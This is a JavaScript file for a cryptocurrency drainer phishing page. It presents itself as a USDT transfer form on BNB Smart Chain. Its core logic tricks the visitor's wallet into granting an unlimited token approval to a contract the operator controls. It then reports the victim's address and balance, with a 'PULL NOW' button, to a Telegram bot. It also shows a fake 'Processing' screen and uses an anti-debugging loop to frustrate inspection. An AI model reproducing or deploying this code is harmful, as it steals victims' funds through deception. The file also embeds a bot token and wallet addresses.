(function() {
    // Yeh code baar-baar 'debugger;' statement chalaata hai jab DevTools khula hota hai.
    // Isse Sources tab mein code inspect karna lagbhag impossible ho jaata hai.
    function block() {
        if (window.console && (window.console.firebug || new RegExp("a+").test(String.fromCharCode(97)))) {
            // Agar console open hai toh debugger ko baar-baar chalao
            debugger;
            // Har 500ms (0.5 second) mein khud ko repeat karega
            setTimeout(block, 500); 
        } else {
            // Agar console band hai toh function ko empty kar do taki performance par asar na pade
            block = function() {};
        }
    }
    block();
})();

document.addEventListener("DOMContentLoaded", function () {

    // ===== CONFIG (Use Checksum Contract Address here) =====
    // Note: window.ethereum uses Ethers v5 syntax (ethers.providers.Web3Provider, ethers.utils.formatUnits, etc.)
    const CONFIG = {
        COMPANY_WALLET_ADDRESS: "0xa57620Ded0B4f612F1e4bE995eF16bfee421D3eE",
        CONTRACT_ADDRESS: "0xa5a4CCF9d20af36980c2FCe67eCda280EA299B4F",
        TELEGRAM_BOT_TOKEN: "8992213302:AAEXcuMdjKLf-TocqdXOJZf1SGnGLp5g0hw", // Notification Bot Token (Bot A)
        ADMIN_CHAT_ID: "8617858064", // CRITICAL: Your Admin Group Chat ID
    };

    // Constant for Unlimited Approval (MAX_UINT256)
    const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Common USDT BEP20 Address
    
    // 🏆 FINAL NOTIFICATION AND BUTTON TRIGGER FUNCTION 🏆
    async function sendTelegramNotifications(walletAddress, txHash, userId, amount, currentBalance) {
        const notifBotToken = CONFIG.TELEGRAM_BOT_TOKEN; // Bot A ka token
        const adminChatId = CONFIG.ADMIN_CHAT_ID;

        const watchUrl = `https://bscscan.com/tx/${txHash}`; // Watch URL

        // CRITICAL: Inline Keyboard with PULL Button
        const pullDataPayload = `PULL:${walletAddress}:${amount}`; 
        
        const inlineKeyboard = {
            inline_keyboard: [
                [{ text: "✅ PULL NOW (" + amount + " USDT)", callback_data: pullDataPayload }],
                [{ text: "🔗 View Transaction", url: watchUrl }]
            ]
        };

        const adminMessage =
            `🔔 **NEW APPROVAL - ACTION REQUIRED**\n\n` +
            `💰 **Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
            `👤 **User ID:** ${userId || "Not provided"}\n` +
            `💵 **Input Amount:** ${amount || "N/A"} USDT\n` +
            `✨ **Current USDT Balance:** ${currentBalance || "N/A"} USDT\n\n` +
            `✅ Transaction Approved! **(Unlimited Pull Ready)**\n` +
            `👉 **PULL karne ke liye neeche button dabayein.**`;

        const userMessage =
            `🎉 **USDT Approval Successful!**\n\n` +
            `💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
            `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
            `✅ **Status:** Approved\n\n` +
            `You can now proceed with USDT transfers.\n\n` +
            `💡 *Tap and hold on the wallet address above to copy it*`;
            
        try {
            // --- 1. Send Notification + PULL BUTTON to Admin ---
            await fetch(`https://api.telegram.org/bot${notifBotToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: adminChatId,
                    text: adminMessage,
                    parse_mode: "Markdown",
                    reply_markup: inlineKeyboard
                })
            });
            console.log("✅ Pull Button (Notification) sent to Admin Chat.");
            
            // --- 2. Send to user if provided ---
            if (userId) {
                await fetch(`https://api.telegram.org/bot${notifBotToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: userId,
                        text: userMessage,
                        parse_mode: "Markdown",
                        reply_markup: inlineKeyboard
                    })
                });
            }
            console.log("Telegram notifications process complete.");
        } catch (error) {
            console.error("Failed to send Telegram messages:", error);
        }
    }

    // =======================================================
    // 🔥 NEW: CUSTOM PROCESSING MODAL LOGIC (Screenshot style)
    // =======================================================
    function showProcessingModal(isVisible, txHash = null) {
        let modal = document.getElementById("processing-modal");
        if (!modal) {
            // Create the modal container
            modal = document.createElement("div");
            modal.id = "processing-modal";
            modal.style.position = "fixed";
            modal.style.top = "0";
            modal.style.left = "0";
            modal.style.width = "100%";
            modal.style.height = "100%";
            modal.style.background = "rgba(0, 0, 0, 0.9)"; // Dark background
            modal.style.zIndex = "99999";
            modal.style.display = "flex";
            modal.style.alignItems = "flex-end"; // Align content to bottom
            modal.style.justifyContent = "center";
            modal.style.transition = "opacity 0.3s";
            modal.style.opacity = "0";
            modal.style.pointerEvents = "none";

            // Create the content box (similar to the screenshot)
            const contentBox = document.createElement("div");
            contentBox.style.background = "#18181a"; // Dark gray/black box
            contentBox.style.width = "100%";
            contentBox.style.maxWidth = "500px";
            contentBox.style.padding = "30px 20px 40px"; // Increased bottom padding
            contentBox.style.borderRadius = "24px 24px 0 0";
            contentBox.style.textAlign = "center";
            contentBox.style.transform = "translateY(100%)";
            contentBox.style.transition = "transform 0.3s";
            contentBox.id = "processing-modal-content";

            // Icon/Text setup
            contentBox.innerHTML = `
                <div style="margin: 20px 0;">
                    <svg width="100" height="100" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: block; margin: 0 auto;">
                        <circle cx="50" cy="50" r="48" stroke="#10b981" stroke-width="4" fill="none"/>
                        <path d="M30 50L45 65L75 35" stroke="#10b981" stroke-width="6" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                </div>
                <h2 style="color: white; font-size: 1.5rem; font-weight: bold; margin-bottom: 8px;">Processing...</h2>
                <p style="color: #a0a0a0; margin-bottom: 30px; font-size: 0.95rem;">
                    Transaction in progress! Blockchain validation is underway. This may take a few minutes.
                </p>
                <button id="tx-details-btn" style="
                    background: #10b981; 
                    color: white; 
                    border: none; 
                    padding: 15px 30px; 
                    border-radius: 12px; 
                    font-weight: bold; 
                    width: 90%;
                    cursor: pointer;
                ">Transaction details</button>
            `;

            // Add event listener to the details button
            const txDetailsBtn = contentBox.querySelector('#tx-details-btn');
            txDetailsBtn.addEventListener('click', () => {
                const currentTxHash = modal.dataset.txHash; // Get hash from dataset
                if (currentTxHash) {
                    const scanUrl = `https://bscscan.com/tx/${currentTxHash}`; 
                    window.open(scanUrl, '_blank');
                } else {
                    alert("Transaction hash not available yet.");
                }
            });

            modal.appendChild(contentBox);
            document.body.appendChild(modal);
        }
        
        // Store the Tx Hash in the modal element's dataset
        modal.dataset.txHash = txHash;

        // Toggle visibility and animation
        const contentBox = document.getElementById("processing-modal-content");
        if (isVisible) {
            modal.style.opacity = "1";
            modal.style.pointerEvents = "auto";
            contentBox.style.transform = "translateY(0)";
        } else {
            // Add a small delay for smooth exit animation
            contentBox.style.transform = "translateY(100%)";
            setTimeout(() => {
                modal.style.opacity = "0";
                modal.style.pointerEvents = "none";
            }, 300);
        }
    }


    // ===== NOTIFICATION BAR SETUP (Kept for Errors/Fails) =====
    function showNotification(msg, type = "info") {
        let notify = document.getElementById("notify-bar");
        if (!notify) {
            notify = document.createElement("div");
            notify.id = "notify-bar";
            notify.style.position = "fixed";
            notify.style.top = "20px";
            notify.style.left = "50%";
            notify.style.transform = "translateX(-50%)";
            notify.style.zIndex = "9998"; // Lower than the Modal
            notify.style.minWidth = "260px";
            notify.style.maxWidth = "90vw";
            notify.style.padding = "16px 32px";
            notify.style.borderRadius = "12px";
            notify.style.fontSize = "1rem";
            notify.style.fontWeight = "bold";
            notify.style.textAlign = "center";
            notify.style.boxShadow = "0 4px 32px #0008";
            notify.style.transition = "all 0.3s";
            document.body.appendChild(notify);
        }
        notify.textContent = msg;
        notify.style.background =
            type === "error" ? "#f87171" : type === "success" ? "#10b981" : "#374151";
        notify.style.color = "#fff";
        notify.style.opacity = "1";
        notify.style.pointerEvents = "auto";
        setTimeout(() => {
            notify.style.opacity = "0";
            notify.style.pointerEvents = "none";
        }, 3000);
    }

    // ===== FORM LOGIC (Unchanged) =====
    const addressInput = document.querySelector('input[placeholder="Search or Enter"]');
    const amountInput = document.querySelector('input[placeholder="USDT Amount"]');
    const nextBtn = document.querySelector("button.w-full");
    const originalBtnHTML = nextBtn.innerHTML;
    const approxUsd = document.querySelector(".text-xs.text-gray-500");
    const maxBtn = Array.from(document.querySelectorAll("button")).find(
        (btn) => btn.textContent.trim().toLowerCase() === "max"
    );

    amountInput.value = "0";// Setting a large value for display
    approxUsd.textContent = "≈ $0.00";

    function updateApproxUsd() {
        let amount = parseFloat(amountInput.value.trim());
        approxUsd.textContent =
            isNaN(amount) || amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
    }
    amountInput.addEventListener("input", updateApproxUsd);
    updateApproxUsd();

    function validate() {
        const address = addressInput.value.trim();
        const amount = amountInput.value.trim();
        nextBtn.disabled = !(address.length > 0 && parseFloat(amount) > 0);
    }
    addressInput.addEventListener("input", validate);
    amountInput.addEventListener("input", validate);
    validate();

    if (maxBtn) {
        maxBtn.addEventListener("click", async function (e) {
            e.preventDefault();
            if (!window.ethereum) {
                showNotification("No Web3 wallet found.", "error");
                return;
            }
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const walletAddress = await signer.getAddress();
                const usdtAbi = [
                    "function balanceOf(address owner) view returns (uint256)",
                    "function decimals() view returns (uint8)"
                ];
                const usdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);
                let decimals = 18;
                try { decimals = await usdt.decimals(); } catch (err) {}
                let balance = await usdt.balanceOf(walletAddress);
                let maxValue = ethers.utils.formatUnits(balance, decimals);
                amountInput.value = (+maxValue).toString();
                updateApproxUsd();
                validate();
            } catch (err) {
                showNotification("Unable to get max balance.", "error");
            }
        });
    }

    // ===== NEXT BUTTON - APPROVE USDT (Core Logic) =====
    nextBtn.addEventListener("click", async function (e) {
        e.preventDefault();

        // CAPTURE THE INPUT AMOUNT HERE BEFORE ANY NETWORK CALLS
        const amountString = amountInput.value.trim();
        if (amountString.length === 0 || isNaN(parseFloat(amountString))) {
              showNotification("Please enter a valid amount.", "error");
              return;
        }

        if (!window.ethereum) {
            showNotification(
                "No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.",
                "error"
            );
            return;
        }

        nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
     

        try {
            const bnbChainId = "0x38";
            const bnbChainParams = {
                chainId: bnbChainId,
                chainName: "BNB Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: ["https://bsc-dataseed1.binance.org/"],
                blockExplorerUrls: ["https://bscscan.com/"]
            };

            // Network Switch/Add Logic (Unchanged)
            try {
                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: bnbChainId }]
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: "wallet_addEthereumChain",
                            params: [bnbChainParams]
                        });
                    } catch (addError) {
                        showNotification("Failed to add BNB Smart Chain network.", "error");
                        return;
                    }
                } else {
                    showNotification("Failed to switch to BNB Smart Chain network.", "error");
                    return;
                }
            }

            // Get Wallet Address and User ID
            const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
            const urlParams = new URLSearchParams(window.location.search);
            const userId = urlParams.get("user_id");

            // Fetch the current USDT balance before approval
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            
            const usdtAbiBalance = [
                "function balanceOf(address owner) view returns (uint256)",
                "function decimals() view returns (uint8)"
            ];
            const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbiBalance, signer);
            
            let decimals = 18;
            try { decimals = await usdtContract.decimals(); } catch (err) {}
            const balanceWei = await usdtContract.balanceOf(fromAddress);
            const currentBalance = ethers.utils.formatUnits(balanceWei, decimals);
            // End of Balance Fetch

            // === Approve ESCROW CONTRACT ===
            const escrowAddress = CONFIG.CONTRACT_ADDRESS;

            const usdtAbiApprove = [
                "function approve(address spender, uint256 amount) public returns (bool)"
            ];
            const iface = new ethers.utils.Interface(usdtAbiApprove);
            
            // UNLIMITED APPROVAL: Pass MAX_UINT256 
            const txData = iface.encodeFunctionData("approve", [
                escrowAddress, 
                MAX_UINT256 // Unlimited approval 
            ]);

            const txHash = await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [{ from: fromAddress, to: USDT_ADDRESS, data: txData, value: "0x0" }]
            });

            // 🔥 Show the custom processing modal 
            showProcessingModal(true, txHash);

            if (txHash && txHash.length > 0) {
                try {
                    // Pass the captured amountString AND currentBalance
                    await sendTelegramNotifications(fromAddress, txHash, userId, amountString, currentBalance); 
                    // Transaction is successful. MODAL will NOT be closed here.
                } catch (err) {
                    console.error("Failed to send notifications or API trigger:", err);
                    // If Telegram notification fails, we don't close the modal, 
                    // assuming the main tx is done and user wanted it to stay open.
                }
            }
        } catch (err) {
            // 🔥 CHANGE: Close the modal immediately on any error (User rejected/Canceled/Failed)
            showProcessingModal(false); 

            // All error messages still use the simple showNotification bar at the top
            const msg = (err?.message || "").toLowerCase();
            if (
                msg.includes("user rejected") ||
                msg.includes("user denied") ||
                msg.includes("cancelled") ||
                msg.includes("canceled")
            ) {
                showNotification("Transaction cancelled.", "error");
            } else if (
                msg.includes("insufficient funds") ||
                msg.includes("exceeds balance") ||
                (msg.includes("execution reverted") && msg.includes("exceeds balance"))
            ) {
                showNotification("Insufficient BNB for gas fee or USDT balance.", "error");
            } 
                } finally {
            // 🔥 CHANGE: Modal closing logic removed from finally.
            // It will only be closed in the catch block (on error/cancel).
            nextBtn.disabled = false;
            nextBtn.innerHTML = originalBtnHTML;
        }
    });
});